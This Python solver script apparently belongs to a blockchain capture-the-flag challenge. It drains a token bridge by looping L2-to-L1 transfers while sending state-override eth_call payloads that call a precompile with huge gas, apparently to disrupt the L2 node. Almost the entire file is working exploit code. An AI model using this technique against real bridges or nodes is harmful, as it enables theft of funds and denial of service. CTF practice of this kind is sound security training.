#!/usr/bin/env python3
import json
import time
from os import system
from time import sleep

import requests
from eth_account import Account
from ctf_solvers.pwn_solver import PwnChallengeSolver
from web3 import Web3
from web3.middleware.signing import construct_sign_and_send_raw_middleware


class Solver(PwnChallengeSolver):
    def _solve(self, rpc, player, challenge):
        payload = json.dumps(
            {
                "method": "eth_call",
                "params": [
                    {
                        "from": None,
                        "to": "0x0000000000000000000000000000000000031337",
                        "data": "0x",
                        "gas": "0xffffffff",
                    },
                    "latest",
                    {
                        "0x0000000000000000000000000000000000031337": {
                            "code": "0x600260005360046001536000600061010260006105396107d0fa"
                        }
                    },
                ],
                "id": 1,
                "jsonrpc": "2.0",
            }
        )
        headers = {"Content-Type": "application/json"}

        player_account = Account.from_key(player)

        UINT256MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
        L1_RPC = rpc[0]
        L2_RPC = rpc[1]

        time.sleep(2)

        l1_web3 = Web3(Web3.HTTPProvider(L1_RPC))
        l1_web3.middleware_onion.add(
            construct_sign_and_send_raw_middleware(player_account)
        )
        l2_web3 = Web3(Web3.HTTPProvider(L2_RPC))
        l2_web3.middleware_onion.add(
            construct_sign_and_send_raw_middleware(player_account)
        )

        BRIDGE = Web3.to_checksum_address(
            l1_web3.eth.call({"to": challenge, "data": Web3.keccak(text="BRIDGE()")})[
                12:
            ].hex()
        )
        TOKEN = Web3.to_checksum_address(
            l1_web3.eth.call(
                {"to": challenge, "data": Web3.keccak(text="FLAG_TOKEN()")}
            )[12:].hex()
        )

        print(f"bridge = {BRIDGE}")
        print(f"flag_token = {TOKEN}")
        print(f"player = {player_account.address}")

        system(
            f"""cast send --rpc-url {L1_RPC} --private-key {player} {TOKEN} 'approve(address,uint256)' {BRIDGE} {UINT256MAX}
        cast send --rpc-url {L1_RPC} --private-key {player} {BRIDGE} 'ERC20Out(address,address,uint256)' {TOKEN} {player_account.address} 1000000000000000000"""
        )

        sleep(15)

        L2TOKEN = l2_web3.eth.call(
            {
                "to": BRIDGE,
                "data": Web3.keccak(text="remoteTokenToLocalToken(address)")[:4].hex()
                + "00" * 12
                + TOKEN[2:],
            }
        )[12:].hex()
        print(f"l2_token = {L2TOKEN}")

        for i in range(100):
            print("bridging l2->l1")
            system(
                f"""
            cast send --rpc-url {L2_RPC} --private-key {player} {BRIDGE} 'ERC20Out(address,address,uint256)' {L2TOKEN} {player_account.address} {500000000000000000 - i}
            """.strip()
            )
            sleep(1)

            for i in range(10):
                response = requests.request(
                    "POST", L2_RPC, headers=headers, data=payload
                )
                print(i, response.text)
                if "error" in response.json():
                    break

            sleep(2)

            balance = int(
                l1_web3.eth.call(
                    {
                        "to": TOKEN,
                        "data": Web3.keccak(text="balanceOf(address)")[:4].hex()
                        + "00" * 12
                        + BRIDGE[2:],
                    }
                ).hex(),
                16,
            )

            print(f"bridge balance = {balance / 1e18}")

            if balance / 1e18 < 90:
                break


Solver().start()
